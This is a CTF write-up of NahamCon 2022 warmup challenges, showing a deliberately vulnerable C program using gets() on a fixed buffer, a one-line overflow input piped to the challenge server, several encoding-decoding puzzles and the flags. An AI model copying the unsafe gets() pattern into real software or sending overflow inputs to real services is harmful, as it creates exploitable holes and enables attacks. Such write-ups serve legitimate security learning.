---
title: NahamCon CTF 2022 - Warmup Writeup Part 2
published: true
---

Part 2 of the warmup challenges for NahamCon CTF 2022.  Part 1 is [here](https://ruddles.github.io/NahamCon-CTF-2022-Warmup-1)

# Crash Override

> Remember, hacking is more than just a crime. It's a survival trait.
> 
> Attachments: crash_override.c, Makefile, crash_override
> 
> Connect to `nc challenge.nahamcon.com 30637`

To start off we can download the 3 files using wget

```
wget -o crash_override.c https://ctf.nahamcon.com/files/f9dc325add89e0bd3302d94d0f370dca/crash_override.c?token=<my-token>
wget -o Makefile https://ctf.nahamcon.com/files/f9dc325add89e0bd3302d94d0f370dca/Makefile?token=<my-token>
wget -o crash_override https://ctf.nahamcon.com/files/f9dc325add89e0bd3302d94d0f370dca/crash_override?token=<my-token>
```

Opening up the C file reveals the following code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <signal.h>

void win(int sig) {
    FILE *fp = NULL;
    char *flag = NULL;
    struct stat sbuf;

    if ((fp = fopen("flag.txt", "r")) == NULL) {
        puts("Failed to open the flag. If this is on the challenge server, contact an admin.");
        exit(EXIT_FAILURE);
    }

    if (fstat(fileno(fp), &sbuf)) {
        puts("Failed to get flag.txt file status. If this is on the challenge server, contact an admin.");
        exit(EXIT_FAILURE);
    }

    flag = calloc(sbuf.st_size + 1, sizeof(char));
    if (!flag) {
        puts("Failed to allocate memory.");
        exit(EXIT_FAILURE);
    }

    fread(flag, sizeof(char), sbuf.st_size, fp);
    puts(flag);

    free(flag);

    exit(EXIT_SUCCESS);
}

int main(void) {
    char buffer[2048];

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    signal(SIGSEGV, win);

    puts("HACK THE PLANET!!!!!!");
    gets(buffer);

    return 0;
}
```

Reading the code, the line `signal(SIGSEGV, win);` means if we can cause a segmentation fault (i.e. cause the application to access memory it isn't allowed to) then the `win` function will run and print out the flag.

The easiest way to cause a seg fault is to cause a buffer overflow, which is where we attempt to stuff more data into a memory location than the application is expecting.

Do you see it?  Look at the first and second-to-last lines in main.  `char buffer[2048];` is setting up a buffer with 2048 bytes of space.  Then `gets(buffer);` will take whatever is in stdin and stuff it into the buffer.  So what happens if stdin contains more than 2048 bytes of data?  Boom.  That's what.  Never use gets.  Hell, even the [bugs section on the man page says don't use it](https://linux.die.net/man/3/gets).

To blow this popsicle stand and get the flag we just need to connect to the server and give it a big load of data on stdin.  We're not going to type all those chars, this is an expensive keyboard, we'll use python for that.  Let's give it 3000 "A" chars for good measure.

```
python3 -c 'print("A" * 3000)' | nc challenge.nahamcon.com 30637
```

Running that and boom, the flag is dumped. `flag{de8b6655b538a0bf567b79a14f2669f6}`

# Read The Rules

> Please follow the rules for this CTF!

How was this not the most solved?  Anyway, I digress.  Go to the rules page at https://ctf.nahamcon.com/rules, view source and Ctrl-f for "flag{" and would you look at that...

![screenshot of the source]({{ site.url }}/assets/post-images/nahamcon-warmup/read-the-rules-source.png)

# Technical Support

> Want to join the party of GIFs, memes and emoji spam? Or just want to ask a question for technical support regarding any challenges in the CTF? Join us in the Discord -- you might just find a flag in the #ctf-help channel!
> 
>[Join the Discord!](https://discord.com/invite/ucCz7uh)

Join the Discord server, then go to the #ctf-help channel and look at the topic.  Then sit in chat and watch people completely miss the topic and type `!flag`

![screenshot of discord topic]({{ site.url }}/assets/post-images/nahamcon-warmup/technical-support-topic.png)

# Wizard

> You have stumbled upon a wizard on your path to the flag. You must answer his questions!
> 
> Connect:
> 
>  nc challenge.nahamcon.com 30310

This one was fun, I used a combo of [Cyber Chef](https://cyberchef.org/) and Python to solve the wizards questions..

## Q1
> First Question: What is the ASCII plaintext corresponding to this binary string? 
> 
>010110100110010101110010011011110111001100100000001001100010000001001111011011100110010101110011

Off to cyber chef we go, give it the binary input then use the "From Binary" operation.  [Or just click this link](https://cyberchef.org/#recipe=From_Binary('Space',8)&input=MDEwMTEwMTAwMTEwMDEwMTAxMTEwMDEwMDExMDExMTEwMTExMDAxMTAwMTAwMDAwMDAxMDAxMTAwMDEwMDAwMDAxMDAxMTExMDExMDExMTAwMTEwMDEwMTAxMTEwMDEx).

![cyber chef binary decode]({{ site.url }}/assets/post-images/nahamcon-warmup/wizard-1-cyber.png)

### Answer
Zeros & Ones

## Q2
> Second Question: What is the ASCII plaintext corresponding to this hex string?
> 
> 4f6820776f77777721204261736520313020697320636f6f6c20616e6420616c6c2062757420486578787878

I jumped into Python for this one as I was getting a code-writing itch.

```python
hex_string = "4f6820776f77777721204261736520313020697320636f6f6c20616e6420616c6c2062757420486578787878"
bytes_array = bytes.fromhex(hex_string)
ascii_str = bytes_array.decode()

print(ascii_str)
```

This simply converts the hex into bytes, then decodes them into ASCII

### Answer
Oh wowww! Base 10 is cool and all but Hexxxx

# Q3
> Third Question: What is the ASCII plaintext corresponding to this octal string?
(HINT: octal -> int -> hex -> chars) 
>
>535451006154133420162312701623127154533472040334725553046256234620151334201413347444030460563312201673122016730267164

Back into Python we go, this time we take the octal number, convert it into a decimal int, then into hex, and finally convert that into bytes and decode to ascii.  It's worth noting that we need to trim the first 2 chars off the hex string to convert it into bytes as it starts with `0x` which means "this is hex".

```python
oct_string = "535451006154133420162312701623127154533472040334725553046256234620151334201413347444030460563312201673122016730267164"
dec = int(oct_string, 8)
hex_string = hex(dec)

bytes_array = bytes.fromhex(hex_string[2:])
ascii_str = bytes_array.decode()

print(ascii_str)

```

### Answer
We can represent numbers in any base we want

## Q4
> Fourth Question: What is the ACII representation of this integer? 
(HINT: int -> hex -> chars)

> 8889185069805239596091046045687553579520816794635237831028832039457

This felt like it should have been before the last question, but never mind.  I just took the last solution and delete a few steps.

```python
int_val = 8889185069805239596091046045687553579520816794635237831028832039457
hex_string = hex(int_val)

bytes_array = bytes.fromhex(hex_string[2:])
ascii_str = bytes_array.decode()

print(ascii_str)
```

### Answer
This is one big 'ol integer!

## Q5
> Fifth Question: What is the ASCII plaintext of this Base64 string? 
> 
> QmFzZXMgb24gYmFzZXMgb24gYmFzZXMgb24gYmFzZXMgOik=

We can use the base64 command for this bad-boy:

```bash
echo "QmFzZXMgb24gYmFzZXMgb24gYmFzZXMgb24gYmFzZXMgOik=" | base64 -d
```

### Answer
Bases on bases on bases on bases :)

## Q6
> Last Question: What is the Big-Endian representation of this Little-Endian hex string?
> 293a2065636e657265666669642065687420776f6e6b206f7420646f6f672073277449

Endian refers to the order the bytes are read, and while we're not going to implement it here there's a [good article on swapping endianness of a number on geeks for geeks](https://www.geeksforgeeks.org/bit-manipulation-swap-endianness-of-a-number/)

However, time is against us so lets just shove it into Cyber Chef and call it a day.  First we'll use the Swap Endianness operation (with Hex as the input and a word length of 35 - half the number of chars), then, because that adds whitespace we'll remove it with Remove Whitespace.  Finally we can use From Hex to convert it into text.  Or just [click here](https://cyberchef.org/#recipe=Swap_endianness('Hex',35,true)Remove_whitespace(true,true,true,true,true,false)From_Hex('None')&input=MjkzYTIwNjU2MzZlNjU3MjY1NjY2NjY5NjQyMDY1Njg3NDIwNzc2ZjZlNmIyMDZmNzQyMDY0NmY2ZjY3MjA3MzI3NzQ0OQ)

![cyber chef endian decode]({{ site.url }}/assets/post-images/nahamcon-warmup/wizard-6-endian.png)

Fun aside - if you change the word length in the Swap endianness operation you can see the text slowly scroll.

### Answer
It's good to know the difference :)

Give that last bit of wisdom over to the wizard and we get the flag.

`flag{c2ed35aba037cd93381b298caa2720ee}`

And with that the warmup is complete, we can move on to some more challenging......challenges.